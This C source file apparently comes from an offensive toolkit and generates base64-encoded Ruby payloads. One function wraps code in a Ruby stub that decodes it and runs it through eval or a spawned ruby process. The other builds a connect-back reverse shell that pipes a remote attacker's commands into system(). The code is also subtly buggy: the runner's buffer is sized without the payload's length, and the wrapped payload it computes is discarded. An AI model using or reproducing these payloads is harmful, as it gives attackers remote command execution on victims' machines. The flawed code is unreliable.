/*  
    -- CONFIDENTIAL - SOURCE MATERIALS --
                                                                                                                                                                                                        
    THIS IS UNPUBLISHED PROPRIETARY SOURCE CODE.
    
    -- CONFIDENTIAL - SOURCE MATERIALS --

 */

#include "ruby_payloads.h"
 
char *
ruby_code_runner(char *payload)
{
	char *runner_code, *encoded_runner_code;
	char runner_string[] = "code = %%(%s).unpack(%%(m0)).first\n if RUBY_PLATFORM =~ /mswin|mingw|win32/\ninp = IO.popen(%%(ruby), %%(wb)) rescue nil\nif inp\ninp.write(code)\ninp.close\nend\nelse\nif ! Process.fork()\neval(code) rescue nil\nend\nend";
	size_t encoded_runner_code_size = 0;

	int len = strlen(runner_string) + 1;

	runner_code = malloc(len);

	snprintf(runner_code, len, runner_string, payload);

	encoded_runner_code = base64_encode(runner_code, strlen(runner_code), &encoded_runner_code_size);

	return encoded_runner_code;
}


char *
ruby_connect_back_shell(char *port, char *ip)
{
	char *backdoor_code, *encoded_backdoor_code;
	char backdoor_string[] = "require 'socket';c=TCPSocket.new(\"%s\",\"%s\");$stdin.reopen(c);$stdout.reopen(c);$stderr.reopen(c);$stdin.each_line{|l|l=l.strip;next if l.length==0;system(l)}";
	size_t encoded_backdoor_code_size;
	char *final_payload; 

	int len = strlen(backdoor_string) + strlen(port) + strlen(ip) + 1;

	backdoor_code = malloc(len);

	snprintf(backdoor_code, len, backdoor_string, ip, port);

	encoded_backdoor_code = base64_encode(backdoor_code, strlen(backdoor_code), &encoded_backdoor_code_size);

	final_payload = ruby_code_runner(encoded_backdoor_code);

	return encoded_backdoor_code;

}